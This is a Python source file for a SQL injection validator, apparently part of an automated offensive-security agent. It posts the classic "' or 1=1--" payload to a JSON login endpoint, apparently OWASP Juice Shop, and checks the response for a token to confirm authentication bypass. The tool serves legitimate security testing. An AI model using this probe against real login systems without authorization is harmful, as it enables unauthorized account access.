from dataclasses import dataclass
import json
from urllib.request import Request, urlopen
from urllib.error import HTTPError
from validation.validator import ValidatorMetadata


@dataclass
class SqliLoginValidationResult:
    url: str
    method: str
    parameter: str
    payload: str
    baseline_status: int
    probe_status: int
    authentication_bypass_observed: bool
    token_observed: bool
    confirmed: bool
    conclusion: str
    error: str | None = None


class SqliLoginValidator:
    """Controlled, non-destructive SQLi validation for a JSON login endpoint."""

    metadata = ValidatorMetadata(
        name="sqli_login_validate",
        description="Validate a suspected login SQL injection using a bounded authentication-bypass probe.",
        category="SQL Injection",
    )

    PAYLOAD = "' or 1=1--"

    def validate(self, target, port, login_path="/rest/user/login"):
        url = f"http://{target}:{port}{login_path}"
        baseline = self._post(url, {"email": "amex.invalid@example.local", "password": "definitely-invalid"})
        probe = self._post(url, {"email": self.PAYLOAD, "password": "definitely-invalid"})
        body = probe["body"]
        token = self._extract_token(body)
        # Juice Shop's vulnerable login path returns a successful authentication
        # response/token for the classic controlled quote-or-true probe.
        bypass = probe["status"] in {200, 201} and bool(token or self._looks_authenticated(body))
        confirmed = bypass
        conclusion = (
            "Controlled login SQL injection probe produced an authenticated response, demonstrating an authentication-bypass condition."
            if confirmed else
            "Controlled login SQL injection probe did not demonstrate authentication bypass."
        )
        return SqliLoginValidationResult(
            url=url,
            method="POST",
            parameter="email",
            payload=self.PAYLOAD,
            baseline_status=baseline["status"],
            probe_status=probe["status"],
            authentication_bypass_observed=bypass,
            token_observed=bool(token),
            confirmed=confirmed,
            conclusion=conclusion,
            error=probe.get("error"),
        )

    @staticmethod
    def _post(url, payload):
        try:
            req = Request(
                url,
                data=json.dumps(payload).encode("utf-8"),
                method="POST",
                headers={
                    "User-Agent": "AMEX-AI-Offensive-Security-Agent/6.0",
                    "Content-Type": "application/json",
                    "Accept": "application/json,*/*",
                },
            )
            with urlopen(req, timeout=8) as response:
                return {"status": response.status, "body": response.read(16000).decode("utf-8", errors="replace"), "error": None}
        except HTTPError as exc:
            return {"status": exc.code, "body": exc.read(16000).decode("utf-8", errors="replace"), "error": str(exc)}
        except Exception as exc:
            return {"status": 0, "body": "", "error": str(exc)}

    @staticmethod
    def _extract_token(body):
        try:
            data = json.loads(body)
        except Exception:
            return None
        return data.get("authentication", {}).get("token") or data.get("token")

    @staticmethod
    def _looks_authenticated(body):
        blob = body.lower()
        return '"authentication"' in blob and '"token"' in blob
